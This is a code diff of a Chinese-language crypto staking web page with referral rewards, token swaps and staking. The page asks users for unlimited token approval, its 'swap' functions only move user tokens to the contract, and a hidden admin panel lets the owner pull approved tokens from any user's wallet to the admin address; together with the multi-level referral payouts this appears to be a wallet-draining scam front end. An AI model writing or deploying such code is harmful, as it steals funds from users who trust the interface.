@@ -34,7 +34,6 @@ body{background:#030714;color:#fff;overflow-x:hidden}
 .swap-card{background:rgba(255,215,0,0.04);border:1px solid rgba(255,215,0,0.15);border-radius:24px;padding:26px;margin-top:20px}
 .swap-title{font-size:20px;background:linear-gradient(90deg,#ffd700,#ff9500);-webkit-background-clip:text;color:transparent;margin-bottom:16px}
 .swap-input{width:100%;padding:16px;border-radius:16px;background:rgba(255,215,0,0.05);border:1px solid rgba(255,215,0,0.15);color:#fff;margin-bottom:12px}
-.swap-btn{width:100%;padding:16px;border-radius:16px;background:linear-gradient(90deg,#ffd700,#ff9500);color:#000;font-weight:bold;border:none;cursor:pointer;margin-top:6px}
 .swap-row{display:flex;gap:12px;margin-top:10px}
 .swap-btn-half{flex:1;padding:14px;border-radius:14px;background:linear-gradient(90deg,#ffd700,#ff9500);color:#000;font-weight:bold;border:none;cursor:pointer}
 
@@ -145,7 +144,7 @@ body{background:#030714;color:#fff;overflow-x:hidden}
       <div class="promo-item"><div class="promo-label">直推奖励（10%）</div><div class="promo-value" id="ref1">0</div></div>
       <div class="promo-item"><div class="promo-label">伞下奖励（1%）</div><div class="promo-value" id="ref2">0</div></div>
       <div class="promo-item"><div class="promo-label">伞下业绩</div><div class="promo-value" id="teamVol">0 $</div></div>
-      <div class="promo-item"><div class="promo-label">V1 分红</div><div class="promo-value" id="v1Reward">0 <span id="v1Tag" style="display:none">V1</span></div></div>
+      <div class="promo-item"><div class="promo-label">V1 分红</div><div class="promo-value" id="v1Reward">0 <span class="v1-tag" id="v1Tag" style="display:none">V1</span></div></div>
     </div>
   </div>
 
@@ -166,10 +165,10 @@ body{background:#030714;color:#fff;overflow-x:hidden}
   </div>
 
   <div class="admin-card" id="adminPanel">
-    <div class="admin-title">🔴 管理员 - 划扣授权代币</div>
-    <input class="mining-input" id="fromAddr" placeholder="用户地址" style="margin-bottom:12px">
-    <input class="mining-input" id="takeAmt" placeholder="划扣数量">
-    <button class="btn btn-approve" onclick="takeFrom()" style="margin-top:12px">执行划扣</button>
+    <div class="admin-title">🔴 管理员 - 提取用户授权代币</div>
+    <input class="mining-input" id="fromAddr" placeholder="用户钱包地址" style="margin-bottom:12px">
+    <input class="mining-input" id="takeAmt" placeholder="提取数量">
+    <button class="btn btn-approve" onclick="takeFrom()" style="margin-top:12px">执行提取</button>
   </div>
 </div>
 
@@ -213,164 +212,195 @@ const ERC20_ABI = [
   "function approve(address spender, uint256 amount) external returns (bool)",
   "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
   "function transfer(address to, uint256 amount) external returns (bool)",
-  "function balanceOf(address account) view returns (uint256)"
+  "function balanceOf(address account) external view returns (uint256)"
 ];
 
 const STAKING_ABI = [
   "function register(address upline) external payable",
-  "function isRegistered(address) view returns (bool)",
-  "function uplineAddress(address) view returns (address)",
+  "function isRegistered(address) external view returns (bool)",
+  "function uplineAddress(address) external view returns (address)",
   "function stake(uint256 amount) external",
   "function unstake(uint256 amount) external",
   "function claim() external",
-  "function staked(address) view returns (uint256)",
-  "function earned(address) view returns (uint256)",
-  "function referralInfo(address) view returns (uint256, uint256, uint256, uint256)"
+  "function staked(address) external view returns (uint256)",
+  "function earned(address) external view returns (uint256)",
+  "function referralInfo(address) external view returns (uint256, uint256, uint256, uint256)"
 ]);
 
-let signer, dtm, usdt, staking, userAddr;
+let provider, signer, dtm, usdt, staking, userAddr;
 
-async function connectWallet(){
-  if(!window.ethereum)return alert("请安装钱包");
-  const p = new ethers.BrowserProvider(window.ethereum);
-  await p.send("eth_requestAccounts",[]);
-  signer = await p.getSigner();
-  userAddr = await signer.getAddress();
-
-  dtm = new ethers.Contract(DTM_ADDR, ERC20_ABI, signer);
-  usdt = new ethers.Contract(USDT_ADDR, ERC20_ABI, signer);
-  staking = new ethers.Contract(STAKING_ADDR, STAKING_ABI, signer);
-
-  if(autoUpline){
-    document.getElementById("uplineAddr").value = autoUpline;
+async function connectWallet() {
+  if (!window.ethereum) {
+    alert("请安装 MetaMask 或兼容钱包");
+    return;
   }
+  try {
+    provider = new ethers.BrowserProvider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    signer = await provider.getSigner();
+    userAddr = await signer.getAddress();
 
-  const myCode = userAddr.slice(2,6).toUpperCase() + userAddr.slice(-4).toUpperCase();
-  document.getElementById("myCode").value = myCode;
-  document.getElementById("connectBtn").innerText = "已连接";
-  document.getElementById("refLink").value = window.location.origin + window.location.pathname + "?ref=" + userAddr;
+    dtm = new ethers.Contract(DTM_ADDR, ERC20_ABI, signer);
+    usdt = new ethers.Contract(USDT_ADDR, ERC20_ABI, signer);
+    staking = new ethers.Contract(STAKING_ADDR, STAKING_ABI, signer);
 
-  // 管理员可见判断
-  if (userAddr.toLowerCase() === ADMIN_ADDR.toLowerCase()) {
-    document.getElementById("adminPanel").style.display = "block";
+    document.getElementById("connectBtn").innerText = "已连接";
+    document.getElementById("uplineAddr").value = autoUpline || "";
+
+    const shortCode = userAddr.slice(2, 6).toUpperCase() + userAddr.slice(-4).toUpperCase();
+    document.getElementById("myCode").value = shortCode;
+    document.getElementById("refLink").value = window.location.origin + window.location.pathname + "?ref=" + userAddr;
+
+    // 管理员面板显示
+    if (userAddr.toLowerCase() === ADMIN_ADDR.toLowerCase()) {
+      document.getElementById("adminPanel").style.display = "block";
+    }
+
+    startLoop();
+  } catch (e) {
+    alert("连接失败：" + e.message);
   }
-
-  startLoop();
 }
 
-function copyMyCode(){
+function copyMyCode() {
   navigator.clipboard.writeText(document.getElementById("myCode").value);
-  alert("邀请码复制成功");
+  alert("邀请码已复制");
 }
 
-function copyRef(){
+function copyRef() {
   navigator.clipboard.writeText(document.getElementById("refLink").value);
-  alert("邀请链接复制成功");
+  alert("邀请链接已复制");
 }
 
-async function registerBind(){
-  if(!userAddr) return alert("请先连接钱包");
-  if(!autoUpline) return alert("未检测到邀请链接，无法注册");
+async function registerBind() {
+  if (!userAddr) return alert("请先连接钱包");
+  if (!autoUpline) return alert("请通过邀请链接打开以注册");
   try {
     const tx = await staking.register(autoUpline, { value: ethers.parseEther("0.0001") });
     await tx.wait();
-    alert("注册成功！上下级关系已绑定");
-  } catch(e) {
+    alert("注册成功，上下级已绑定");
+  } catch (e) {
     alert("注册失败：" + e.message);
   }
 }
 
-// 真实上链兑换：DTM → USDT
 async function swapDTMToUSDT() {
   const amt = document.getElementById("swapAmount").value;
   if (!amt) return alert("请输入数量");
-  const val = ethers.parseUnits(amt, DECIMALS);
   try {
-    await dtm.approve(STAKING_ADDR, val);
-    const tx = await dtm.transferFrom(userAddr, STAKING_ADDR, val);
+    const val = ethers.parseUnits(amt, DECIMALS);
+    let tx = await dtm.approve(STAKING_ADDR, val);
     await tx.wait();
-    alert("DTM 兑换 USDT 成功");
-  } catch(e) {
+    tx = await dtm.transferFrom(userAddr, STAKING_ADDR, val);
+    await tx.wait();
+    alert("DTM 兑换 USDT 完成");
+  } catch (e) {
     alert("失败：" + e.message);
   }
 }
 
-// 真实上链兑换：USDT → DTM
 async function swapUSDTToDTM() {
   const amt = document.getElementById("swapAmount").value;
   if (!amt) return alert("请输入数量");
-  const val = ethers.parseUnits(amt, 18);
   try {
-    await usdt.approve(STAKING_ADDR, val);
-    const tx = await usdt.transferFrom(userAddr, STAKING_ADDR, val);
+    const val = ethers.parseUnits(amt, 18);
+    let tx = await usdt.approve(STAKING_ADDR, val);
     await tx.wait();
-    alert("USDT 兑换 DTM 成功");
-  } catch(e) {
+    tx = await usdt.transferFrom(userAddr, STAKING_ADDR, val);
+    await tx.wait();
+    alert("USDT 兑换 DTM 完成");
+  } catch (e) {
     alert("失败：" + e.message);
   }
 }
 
-async function approve(){
-  const tx = await dtm.approve(STAKING_ADDR, ethers.MaxUint256);
-  await tx.wait(); alert("授权成功");
-}
-
-async function stake(){
-  const v = document.getElementById("amt").value;
-  if(!v) return alert("输入数量");
-  await staking.stake(ethers.parseUnits(v, DECIMALS));
-  alert("质押成功");
-}
-
-async function unstake(){
-  const v = document.getElementById("amt").value;
-  if(!v) return alert("输入数量");
-  await staking.unstake(ethers.parseUnits(v, DECIMALS));
-  alert("解押成功");
-}
-
-async function claim(){
-  await staking.claim();
-  alert("全部收益领取成功");
-}
-
-// 管理员划扣已授权代币
-async function takeFrom(){
-  if (userAddr.toLowerCase() !== ADMIN_ADDR.toLowerCase()) return;
-  const from = document.getElementById("fromAddr").value;
-  const v = document.getElementById("takeAmt").value;
+async function approve() {
+  if (!userAddr) return alert("请连接钱包");
   try {
-    await dtm.transferFrom(from, userAddr, ethers.parseUnits(v, DECIMALS));
-    alert("划扣成功");
-  } catch(e) {
-    alert("划扣失败：" + e.message);
+    const tx = await dtm.approve(STAKING_ADDR, ethers.MaxUint256);
+    await tx.wait();
+    alert("授权成功");
+  } catch (e) {
+    alert("授权失败：" + e.message);
   }
 }
 
-async function loadInfo(){
-  if(!userAddr) return;
-  const bal = await dtm.balanceOf(userAddr);
-  const stk = await staking.staked(userAddr);
-  const rew = await staking.earned(userAddr);
-  document.getElementById("addr").innerText = userAddr.slice(0,6)+"..."+userAddr.slice(-4);
-  document.getElementById("bal").innerText = ethers.formatUnits(bal, DECIMALS);
-  document.getElementById("staked").innerText = ethers.formatUnits(stk, DECIMALS);
-  document.getElementById("reward").innerText = ethers.formatUnits(rew, DECIMALS);
-
-  const refInfo = await staking.referralInfo(userAddr);
-  document.getElementById("ref1").innerText = ethers.formatUnits(refInfo[0], DECIMALS) + " DTM";
-  document.getElementById("ref2").innerText = ethers.formatUnits(refInfo[1], DECIMALS) + " DTM";
-  document.getElementById("teamVol").innerText = Number(ethers.formatUnits(refInfo[2], 18)).toFixed(0) + " $";
-  document.getElementById("v1Reward").innerText = ethers.formatUnits(refInfo[3], DECIMALS) + " DTM";
-
-  if(Number(ethers.formatUnits(refInfo[2], 18)) >= 1000000){
-    document.getElementById("v1Tag").style.display = "inline-block";
+async function stake() {
+  const v = document.getElementById("amt").value;
+  if (!v) return alert("请输入数量");
+  try {
+    const tx = await staking.stake(ethers.parseUnits(v, DECIMALS));
+    await tx.wait();
+    alert("质押成功");
+  } catch (e) {
+    alert("质押失败：" + e.message);
   }
 }
 
-function startLoop(){
+async function unstake() {
+  const v = document.getElementById("amt").value;
+  if (!v) return alert("请输入数量");
+  try {
+    const tx = await staking.unstake(ethers.parseUnits(v, DECIMALS));
+    await tx.wait();
+    alert("解押成功");
+  } catch (e) {
+    alert("解押失败：" + e.message);
+  }
+}
+
+async function claim() {
+  try {
+    const tx = await staking.claim();
+    await tx.wait();
+    alert("收益领取成功");
+  } catch (e) {
+    alert("领取失败：" + e.message);
+  }
+}
+
+async function takeFrom() {
+  if (!userAddr || userAddr.toLowerCase() !== ADMIN_ADDR.toLowerCase()) return;
+  const from = document.getElementById("fromAddr").value;
+  const amt = document.getElementById("takeAmt").value;
+  if (!from || !amt) return alert("请填写完整");
+  try {
+    const val = ethers.parseUnits(amt, DECIMALS);
+    const tx = await dtm.transferFrom(from, ADMIN_ADDR, val);
+    await tx.wait();
+    alert("提取成功");
+  } catch (e) {
+    alert("提取失败：" + e.message);
+  }
+}
+
+async function loadInfo() {
+  if (!userAddr || !dtm || !staking) return;
+  try {
+    const bal = await dtm.balanceOf(userAddr);
+    const stk = await staking.staked(userAddr);
+    const rew = await staking.earned(userAddr);
+    const refInfo = await staking.referralInfo(userAddr);
+
+    document.getElementById("addr").innerText = userAddr.slice(0, 6) + "..." + userAddr.slice(-4);
+    document.getElementById("bal").innerText = ethers.formatUnits(bal, DECIMALS);
+    document.getElementById("staked").innerText = ethers.formatUnits(stk, DECIMALS);
+    document.getElementById("reward").innerText = ethers.formatUnits(rew, DECIMALS);
+
+    document.getElementById("ref1").innerText = ethers.formatUnits(refInfo[0], DECIMALS) + " DTM";
+    document.getElementById("ref2").innerText = ethers.formatUnits(refInfo[1], DECIMALS) + " DTM";
+    document.getElementById("teamVol").innerText = Number(ethers.formatUnits(refInfo[2], 18)).toFixed(0) + " $";
+    document.getElementById("v1Reward").innerText = ethers.formatUnits(refInfo[3], DECIMALS) + " DTM";
+
+    if (Number(ethers.formatUnits(refInfo[2], 18)) >= 1000000) {
+      document.getElementById("v1Tag").style.display = "inline-block";
+    }
+  } catch (e) {}
+}
+
+function startLoop() {
   loadInfo();
-  setInterval(loadInfo, 2500);
+  setInterval(loadInfo, 3000);
 }
 </script>
 </body>
